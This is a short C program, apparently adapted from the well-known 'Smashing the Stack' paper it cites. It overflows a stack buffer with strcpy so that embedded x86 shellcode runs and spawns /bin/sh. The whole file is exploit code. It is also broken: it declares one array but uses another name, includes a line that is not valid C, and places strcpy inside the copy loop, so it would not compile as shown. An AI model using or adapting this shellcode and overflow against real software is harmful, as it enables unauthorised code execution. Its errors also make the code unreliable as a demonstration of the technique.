#include <stdio.h>
#include <string.h>

# Reference: https://inst.eecs.berkeley.edu/~cs161/archive/fa08/papers/stack_smashing.pdf

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
char large_string[128];

int main() {
  char buffer[108];
  int i;
  long *big_ptr = (long *) big_string;
  
  for (i = 0; i < 32; i++) {
    *(big_ptr + i) = (int) buffer;
  }

  for (i = 0; i < strlen(shellcode); i++) {
    big_string[i] = shellcode[i];
    strcpy(buffer, big_string);
  }
}
